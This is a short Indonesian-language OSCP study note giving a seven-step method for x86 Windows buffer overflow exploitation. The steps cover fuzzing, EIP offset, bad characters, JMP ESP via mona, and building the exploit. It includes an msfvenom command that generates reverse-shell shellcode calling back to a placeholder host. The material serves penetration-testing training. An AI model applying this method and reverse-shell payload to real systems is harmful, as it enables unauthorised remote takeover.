---
name: "Buffer Overflow Methodology — 7-Step Workflow"
description: "Complete x86 Windows buffer overflow exploitation methodology for OSCP: fuzzing, EIP offset, bad character identification, JMP ESP, shellcode generation, and full exploit development."
tags: [buffer-overflow, bof, exploit-development, x86, immunity-debugger, mona]
---

# Buffer Overflow Methodology

BOF tidak lagi dijamin ada di exam OSCP+ (sejak 2023), tapi tetap mungkin muncul. Metodologi ini harus bisa dieksekusi dalam <30 menit.

## 7-Step Workflow (x86 Windows)

1. **Fuzzing**: Kirim string panjang bertahap → trigger crash → catat byte count
2. **Find EIP Offset**: `msf-pattern_create` + `msf-pattern_offset` → temukan offset exact
3. **Confirm EIP Control**: Offset A's + "BBBB" → verifikasi EIP = 0x42424242
4. **Find Bad Characters**: Kirim semua byte (\x00-\xff) kecuali \x00 → bandingkan dengan mona bytearray
5. **Find JMP ESP**: `!mona jmp -r esp -cpb "\x00..."` → dapatkan address tanpa badchars
6. **Generate Shellcode**: `msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -b "\x00..." -f py`
7. **Exploit**: Offset + JMP ESP + NOPs + shellcode → catch shell

## Tools Required

- Immunity Debugger + mona.py
- `msf-pattern_create` / `msf-pattern_offset` (Kali)
- `msfvenom` (Kali)
- Python socket scripting

## Key Points

- **Little endian**: address JMP ESP harus dibalik byte-nya
- **NOP sled**: 16-32 bytes \x90 sebelum shellcode
- **Bad chars**: \x00 selalu bad. Cari bad chars lain dengan mona compare.
- **ASLR/DEP bypass**: cari module tanpa proteksi (`!mona modules`)

## Best Practices

- Siapkan template Python exploit script
- Test shellcode dengan msfvenom sebelum integrate ke exploit
- Catat semua badchars — satu badchar terlewat bisa bikin exploit gagal
- Jika exploit tidak kerja, double-check: offset, endianness, badchars, JMP ESP address
